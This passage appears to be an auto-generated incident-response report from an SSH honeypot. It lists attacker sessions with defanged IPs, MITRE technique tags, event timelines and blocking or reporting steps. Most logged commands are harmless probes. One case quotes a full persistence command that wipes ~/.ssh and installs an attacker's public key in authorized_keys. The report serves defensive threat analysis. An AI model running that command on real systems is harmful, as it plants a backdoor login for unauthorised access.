| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_c3b8cc86fa275694f8be015cc8732614_small_control'"'"' '"'"'check_c3b8cc86fa275694f8be015cc8732614'"'"'', printf '\n%s|%s\n' 'check_c3b8cc86fa275694f8be015cc8732614_small_control' 'check_c3b8cc86fa275694f8be015cc8732614', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_c3b8cc86fa275694f8be015cc8732614_small_math'"'"' "$((255*827+53))"', (255*827+53, printf '\n%s|%s\n' 'check_c3b8cc86fa275694f8be015cc8732614_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 04:35:55` | `cowrie.session.connect` |
| `2026-11-12 04:35:55` | `cowrie.client.version` |
| `2026-11-12 04:35:55` | `cowrie.client.kex` |
| `2026-11-12 04:36:02` | `cowrie.login.success` |
| `2026-11-12 04:36:09` | `cowrie.client.size` |
| `2026-11-12 04:36:09` | `cowrie.session.params` |
| `2026-11-12 04:36:11` | `cowrie.command.input` |
| `2026-11-12 04:36:11` | `cowrie.command.input` |
| `2026-11-12 04:36:11` | `cowrie.command.input` |
| `2026-11-12 04:36:11` | `cowrie.command.input` |
| `2026-11-12 04:36:11` | `cowrie.command.input` |
| `2026-11-12 04:36:11` | `cowrie.command.input` |
| `2026-11-12 04:36:11` | `cowrie.command.input` |
| `2026-11-12 04:36:11` | `cowrie.command.input` |
| `2026-11-12 04:36:11` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]75` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-293368a5bb9c

| Field | Detail |
|---|---|
| **Source IP** | `117.236.124[.]166` |
| **First Seen** | 2026-11-12 04:37 |
| **Last Seen** | 2026-11-12 04:37 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 04:37:16` | `cowrie.session.connect` |
| `2026-11-12 04:37:16` | `cowrie.client.version` |
| `2026-11-12 04:37:16` | `cowrie.client.kex` |
| `2026-11-12 04:37:17` | `cowrie.login.success` |
| `2026-11-12 04:37:18` | `cowrie.client.size` |
| `2026-11-12 04:37:19` | `cowrie.session.params` |
| `2026-11-12 04:37:28` | `cowrie.log.closed` |
| `2026-11-12 04:37:30` | `cowrie.session.params` |
| `2026-11-12 04:37:30` | `cowrie.command.input` |
| `2026-11-12 04:37:30` | `cowrie.log.closed` |
| `2026-11-12 04:37:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.236.124[.]166` to AbuseIPDB if not already reported
- [ ] Block `117.236.124[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24f73de9a91a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]75` |
| **First Seen** | 2026-11-12 04:38 |
| **Last Seen** | 2026-11-12 04:38 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_39d660551ddf9d6a65c70cd9f5043e96_small_control'"'"' '"'"'check_39d660551ddf9d6a65c70cd9f5043e96'"'"'', printf '\n%s|%s\n' 'check_39d660551ddf9d6a65c70cd9f5043e96_small_control' 'check_39d660551ddf9d6a65c70cd9f5043e96', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_39d660551ddf9d6a65c70cd9f5043e96_small_math'"'"' "$((849*878+63))"', (849*878+63, printf '\n%s|%s\n' 'check_39d660551ddf9d6a65c70cd9f5043e96_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 04:38:29` | `cowrie.session.connect` |
| `2026-11-12 04:38:30` | `cowrie.client.version` |
| `2026-11-12 04:38:30` | `cowrie.client.kex` |
| `2026-11-12 04:38:38` | `cowrie.login.success` |
| `2026-11-12 04:38:42` | `cowrie.client.size` |
| `2026-11-12 04:38:45` | `cowrie.session.params` |
| `2026-11-12 04:38:46` | `cowrie.command.input` |
| `2026-11-12 04:38:46` | `cowrie.command.input` |
| `2026-11-12 04:38:46` | `cowrie.command.input` |
| `2026-11-12 04:38:46` | `cowrie.command.input` |
| `2026-11-12 04:38:46` | `cowrie.command.input` |
| `2026-11-12 04:38:46` | `cowrie.command.input` |
| `2026-11-12 04:38:46` | `cowrie.command.input` |
| `2026-11-12 04:38:46` | `cowrie.command.input` |
| `2026-11-12 04:38:46` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]75` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe8d584d1179

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]75` |
| **First Seen** | 2026-11-12 04:42 |
| **Last Seen** | 2026-11-12 04:43 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_ee70e9586c1a2aa84671371c876a8a61_small_control'"'"' '"'"'check_ee70e9586c1a2aa84671371c876a8a61'"'"'', printf '\n%s|%s\n' 'check_ee70e9586c1a2aa84671371c876a8a61_small_control' 'check_ee70e9586c1a2aa84671371c876a8a61', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_ee70e9586c1a2aa84671371c876a8a61_small_math'"'"' "$((224*277+28))"', (224*277+28, printf '\n%s|%s\n' 'check_ee70e9586c1a2aa84671371c876a8a61_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 04:42:54` | `cowrie.session.connect` |
| `2026-11-12 04:42:56` | `cowrie.client.version` |
| `2026-11-12 04:42:56` | `cowrie.client.kex` |
| `2026-11-12 04:43:01` | `cowrie.login.success` |
| `2026-11-12 04:43:06` | `cowrie.client.size` |
| `2026-11-12 04:43:09` | `cowrie.session.params` |
| `2026-11-12 04:43:11` | `cowrie.command.input` |
| `2026-11-12 04:43:11` | `cowrie.command.input` |
| `2026-11-12 04:43:11` | `cowrie.command.input` |
| `2026-11-12 04:43:11` | `cowrie.command.input` |
| `2026-11-12 04:43:11` | `cowrie.command.input` |
| `2026-11-12 04:43:11` | `cowrie.command.input` |
| `2026-11-12 04:43:11` | `cowrie.command.input` |
| `2026-11-12 04:43:11` | `cowrie.command.input` |
| `2026-11-12 04:43:11` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]75` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1e528376406

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]75` |
| **First Seen** | 2026-11-12 04:45 |
| **Last Seen** | 2026-11-12 04:45 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_5728f3cc567df11af60b655db3179bb6_small_control'"'"' '"'"'check_5728f3cc567df11af60b655db3179bb6'"'"'', printf '\n%s|%s\n' 'check_5728f3cc567df11af60b655db3179bb6_small_control' 'check_5728f3cc567df11af60b655db3179bb6', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_5728f3cc567df11af60b655db3179bb6_small_math'"'"' "$((379*971+3))"', (379*971+3, printf '\n%s|%s\n' 'check_5728f3cc567df11af60b655db3179bb6_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 04:45:09` | `cowrie.session.connect` |
| `2026-11-12 04:45:11` | `cowrie.client.version` |
| `2026-11-12 04:45:11` | `cowrie.client.kex` |
| `2026-11-12 04:45:20` | `cowrie.login.success` |
| `2026-11-12 04:45:27` | `cowrie.client.size` |
| `2026-11-12 04:45:32` | `cowrie.session.params` |
| `2026-11-12 04:45:34` | `cowrie.command.input` |
| `2026-11-12 04:45:34` | `cowrie.command.input` |
| `2026-11-12 04:45:34` | `cowrie.command.input` |
| `2026-11-12 04:45:34` | `cowrie.command.input` |
| `2026-11-12 04:45:34` | `cowrie.command.input` |
| `2026-11-12 04:45:34` | `cowrie.command.input` |
| `2026-11-12 04:45:34` | `cowrie.command.input` |
| `2026-11-12 04:45:34` | `cowrie.command.input` |
| `2026-11-12 04:45:34` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]75` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91135c9297f1

| Field | Detail |
|---|---|
| **Source IP** | `103.112.54[.]86` |
| **First Seen** | 2026-11-12 04:45 |
| **Last Seen** | 2026-11-12 04:45 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 04:45:11` | `cowrie.session.connect` |
| `2026-11-12 04:45:11` | `cowrie.client.version` |
| `2026-11-12 04:45:12` | `cowrie.client.kex` |
| `2026-11-12 04:45:13` | `cowrie.login.success` |
| `2026-11-12 04:45:14` | `cowrie.session.params` |
| `2026-11-12 04:45:14` | `cowrie.command.input` |
| `2026-11-12 04:45:14` | `cowrie.command.failed` |
| `2026-11-12 04:45:14` | `cowrie.log.closed` |
| `2026-11-12 04:45:15` | `cowrie.session.params` |
| `2026-11-12 04:45:15` | `cowrie.command.input` |
| `2026-11-12 04:45:16` | `cowrie.session.file_download` |
| `2026-11-12 04:45:16` | `cowrie.log.closed` |
| `2026-11-12 04:45:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.112.54[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.112.54[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5e3fb12720d

| Field | Detail |
|---|---|
| **Source IP** | `103.112.54[.]86` |
| **First Seen** | 2026-11-12 04:45 |
| **Last Seen** | 2026-11-12 04:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 04:45:16` | `cowrie.session.connect` |
| `2026-11-12 04:45:16` | `cowrie.client.version` |
| `2026-11-12 04:45:16` | `cowrie.client.kex` |
| `2026-11-12 04:45:17` | `cowrie.login.success` |
| `2026-11-12 04:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.112.54[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.112.54[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f3769f85bc8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]75` |
| **First Seen** | 2026-11-12 04:47 |
| **Last Seen** | 2026-11-12 04:47 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4486ec72db46a4a7b48a5c32965e8171_small_control'"'"' '"'"'check_4486ec72db46a4a7b48a5c32965e8171'"'"'', printf '\n%s|%s\n' 'check_4486ec72db46a4a7b48a5c32965e8171_small_control' 'check_4486ec72db46a4a7b48a5c32965e8171', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4486ec72db46a4a7b48a5c32965e8171_small_math'"'"' "$((594*80+83))"', (594*80+83, printf '\n%s|%s\n' 'check_4486ec72db46a4a7b48a5c32965e8171_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 04:47:17` | `cowrie.session.connect` |
| `2026-11-12 04:47:21` | `cowrie.client.version` |
| `2026-11-12 04:47:21` | `cowrie.client.kex` |
| `2026-11-12 04:47:35` | `cowrie.login.success` |
| `2026-11-12 04:47:43` | `cowrie.client.size` |
| `2026-11-12 04:47:46` | `cowrie.session.params` |
| `2026-11-12 04:47:50` | `cowrie.command.input` |
| `2026-11-12 04:47:50` | `cowrie.command.input` |
| `2026-11-12 04:47:50` | `cowrie.command.input` |
| `2026-11-12 04:47:50` | `cowrie.command.input` |
| `2026-11-12 04:47:50` | `cowrie.command.input` |
| `2026-11-12 04:47:50` | `cowrie.command.input` |
| `2026-11-12 04:47:50` | `cowrie.command.input` |
| `2026-11-12 04:47:50` | `cowrie.command.input` |
| `2026-11-12 04:47:50` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]75` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30c30e0735bd

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-12 04:47 |
| **Last Seen** | 2026-11-12 04:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 04:47:27` | `cowrie.session.connect` |
| `2026-11-12 04:47:27` | `cowrie.client.version` |
| `2026-11-12 04:47:27` | `cowrie.client.kex` |
| `2026-11-12 04:47:28` | `cowrie.login.success` |
| `2026-11-12 04:47:28` | `cowrie.direct-tcpip.request` |
| `2026-11-12 04:47:28` | `cowrie.direct-tcpip.data` |
| `2026-11-12 04:47:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (423) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-34c44fbcd71c | HIGH | `92.118.39[.]75` | 2026-11-12 04:49 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-2bc91d78169a | HIGH | `109.160.32[.]149` | 2026-11-12 04:52 | Y | 1 | 0 | `T1078 · T1592` |
| IR-accda5806e57 | HIGH | `138.84.41[.]250` | 2026-11-12 04:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7d98c305939c | HIGH | `138.84.41[.]250` | 2026-11-12 04:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-266cf44a2460 | HIGH | `193.32.162[.]84` | 2026-11-12 05:02 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-6bdcadb31792 | HIGH | `193.32.162[.]84` | 2026-11-12 05:04 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-0386abbc9c8e | HIGH | `193.32.162[.]84` | 2026-11-12 05:06 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-1a14caf9e225 | HIGH | `77.90.185[.]29` | 2026-11-12 05:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a2f121e302c9 | HIGH | `193.32.162[.]84` | 2026-11-12 05:08 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b11d10cf6a86 | HIGH | `12.156.67[.]18` | 2026-11-12 05:10 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-57615393eef2 | HIGH | `12.156.67[.]18` | 2026-11-12 05:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-299e01a0ee18 | HIGH | `193.32.162[.]84` | 2026-11-12 05:11 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-adf7a3b78247 | HIGH | `144.22.238[.]238` | 2026-11-12 05:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8f43dec91645 | HIGH | `193.32.162[.]84` | 2026-11-12 05:13 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-141c3a9b85a3 | HIGH | `193.32.162[.]84` | 2026-11-12 05:15 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e7be6242f330 | HIGH | `193.32.162[.]84` | 2026-11-12 05:20 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-98d570924060 | HIGH | `193.32.162[.]84` | 2026-11-12 05:22 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-43c87a69495d | HIGH | `193.32.162[.]84` | 2026-11-12 05:24 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-7853b59ef586 | HIGH | `193.32.162[.]84` | 2026-11-12 05:26 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-bc9083ef8c9b | HIGH | `193.32.162[.]84` | 2026-11-12 05:28 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9d6b07100137 | HIGH | `193.32.162[.]84` | 2026-11-12 05:30 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-838c1ad05b5d | HIGH | `193.32.162[.]84` | 2026-11-12 05:32 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-4207fea30929 | HIGH | `193.32.162[.]84` | 2026-11-12 05:34 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-bfdd73ce457c | HIGH | `193.32.162[.]84` | 2026-11-12 05:36 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-55ecc064b987 | HIGH | `193.32.162[.]84` | 2026-11-12 05:38 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-7773533c1f4a | HIGH | `193.32.162[.]84` | 2026-11-12 05:40 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9b9206b3717c | HIGH | `193.32.162[.]84` | 2026-11-12 05:42 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-313e6dccf5ec | HIGH | `193.32.162[.]84` | 2026-11-12 05:44 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-20ef01c4ed54 | HIGH | `193.32.162[.]84` | 2026-11-12 05:46 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-1ab3240ba1f8 | HIGH | `193.32.162[.]84` | 2026-11-12 05:48 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-3b22256818a3 | HIGH | `193.32.162[.]84` | 2026-11-12 05:50 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-09f684810b5c | HIGH | `193.32.162[.]84` | 2026-11-12 05:52 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b1ffc2812354 | HIGH | `193.32.162[.]84` | 2026-11-12 05:53 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-2fbefaf566ab | HIGH | `193.32.162[.]84` | 2026-11-12 05:55 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-7fb2857509a5 | HIGH | `193.32.162[.]84` | 2026-11-12 05:57 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-103391a6a143 | HIGH | `193.32.162[.]84` | 2026-11-12 05:59 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d38ef9ab3c4e | HIGH | `109.160.32[.]149` | 2026-11-12 06:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-3f0e531338f0 | HIGH | `193.32.162[.]15` | 2026-11-12 06:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a5cee4e50376 | HIGH | `193.32.162[.]84` | 2026-11-12 06:03 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b4bb783ec869 | HIGH | `193.32.162[.]84` | 2026-11-12 06:06 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-4ecece96d443 | HIGH | `120.48.14[.]39` | 2026-11-12 06:07 | Y | 0 | 0 | `T1078 · T1105 · T1592` |
| IR-57b1b23f329c | HIGH | `193.32.162[.]84` | 2026-11-12 06:08 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-80cf7dbb7ca3 | HIGH | `45.148.10[.]61` | 2026-11-12 06:09 | Y | 1 | 0 | `T1078 · T1592` |
| IR-8ca161dc9ea5 | HIGH | `176.53.159[.]196` | 2026-11-12 06:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-05be20efca9a | HIGH | `103.159.199[.]43` | 2026-11-12 06:15 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2217bffcf204 | HIGH | `103.159.199[.]43` | 2026-11-12 06:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d7e6c45650ea | HIGH | `195.178.110[.]78` | 2026-11-12 06:29 | Y | 0 | 0 | `T1078` |
| IR-b329ef3da20f | HIGH | `195.178.110[.]204` | 2026-11-12 06:35 | Y | 0 | 0 | `T1078` |
| IR-4de254edc53a | HIGH | `186.96.158[.]180` | 2026-11-12 06:37 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-03816aea524f | HIGH | `186.96.158[.]180` | 2026-11-12 06:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-677fe281be05 | HIGH | `35.210.75[.]156` | 2026-11-12 06:38 | Y | 3 | 0 | `T1078` |
| IR-2b097c032f68 | HIGH | `35.210.75[.]156` | 2026-11-12 06:38 | Y | 1 | 0 | `T1078` |
| IR-ed103531ba99 | HIGH | `35.210.75[.]156` | 2026-11-12 06:38 | Y | 0 | 0 | `T1078` |
| IR-d25206726628 | HIGH | `129.121.77[.]168` | 2026-11-12 06:54 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8ac41ea4e800 | HIGH | `129.121.77[.]168` | 2026-11-12 06:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-838b71fb2078 | HIGH | `138.226.239[.]234` | 2026-11-12 07:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7016d6652346 | HIGH | `96.78.175[.]36` | 2026-11-12 07:11 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-680e50ade0ce | HIGH | `96.78.175[.]36` | 2026-11-12 07:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-92d86d01ff08 | HIGH | `35.210.120[.]245` | 2026-11-12 07:23 | Y | 3 | 0 | `T1078` |
| IR-3b53da76e391 | HIGH | `35.210.120[.]245` | 2026-11-12 07:24 | Y | 1 | 0 | `T1078` |
| IR-3ae93518fe46 | HIGH | `35.210.120[.]245` | 2026-11-12 07:24 | Y | 0 | 0 | `T1078` |
| IR-29deca17e34a | HIGH | `35.206.133[.]206` | 2026-11-12 07:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-84ce8f8a2cba | HIGH | `46.100.248[.]130` | 2026-11-12 07:57 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-baf6d9489981 | HIGH | `46.100.248[.]130` | 2026-11-12 07:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3349d27cb827 | HIGH | `92.118.39[.]63` | 2026-11-12 07:57 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-0023005edaab | HIGH | `35.206.141[.]203` | 2026-11-12 07:59 | Y | 3 | 0 | `T1078` |
| IR-fa47814f1bc5 | HIGH | `35.206.141[.]203` | 2026-11-12 07:59 | Y | 0 | 0 | `T1078` |
| IR-8792b506d1ac | HIGH | `35.206.141[.]203` | 2026-11-12 07:59 | Y | 1 | 0 | `T1078` |
| IR-b05fd5de57f5 | HIGH | `92.118.39[.]63` | 2026-11-12 08:00 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-812bc730facd | HIGH | `45.148.10[.]61` | 2026-11-12 08:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-4f71660b1d53 | HIGH | `92.118.39[.]63` | 2026-11-12 08:03 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-712a4c66c6c0 | HIGH | `92.118.39[.]63` | 2026-11-12 08:06 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-fd74dbf06ceb | HIGH | `92.118.39[.]63` | 2026-11-12 08:09 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-472fb291edf3 | HIGH | `42.51.42[.]209` | 2026-11-12 08:12 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-17d352c26273 | HIGH | `42.51.42[.]209` | 2026-11-12 08:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ef7706996aa8 | HIGH | `92.118.39[.]63` | 2026-11-12 08:13 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-f922ffa8cc5a | HIGH | `209.141.47[.]217` | 2026-11-12 08:16 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5ae2acfd0d2e | HIGH | `92.118.39[.]63` | 2026-11-12 08:16 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-0e34f61a5190 | HIGH | `209.141.47[.]217` | 2026-11-12 08:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6d06ec57ae16 | HIGH | `92.118.39[.]63` | 2026-11-12 08:23 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-48d632de92ba | HIGH | `92.118.39[.]63` | 2026-11-12 08:27 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-827fcb72fb91 | HIGH | `92.118.39[.]63` | 2026-11-12 08:31 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-621a7415c0d0 | HIGH | `78.128.112[.]74` | 2026-11-12 08:34 | Y | 1 | 0 | `T1078 · T1592` |
| IR-ef01fb9a8a23 | HIGH | `92.118.39[.]63` | 2026-11-12 08:34 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e4db1ba888af | HIGH | `92.118.39[.]63` | 2026-11-12 08:38 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-a20805d9d8da | HIGH | `92.118.39[.]63` | 2026-11-12 08:41 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-bde1e99484ae | HIGH | `92.118.39[.]63` | 2026-11-12 08:44 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-57340558cefa | HIGH | `176.53.159[.]196` | 2026-11-12 08:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a5ed7d879fbf | HIGH | `92.118.39[.]63` | 2026-11-12 08:47 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-44a9c7a0666d | HIGH | `92.118.39[.]63` | 2026-11-12 08:51 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-1252b0eaefee | HIGH | `92.118.39[.]63` | 2026-11-12 08:54 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-1a765881ce16 | HIGH | `92.118.39[.]63` | 2026-11-12 08:57 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-384356c00d4b | HIGH | `92.118.39[.]63` | 2026-11-12 09:00 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
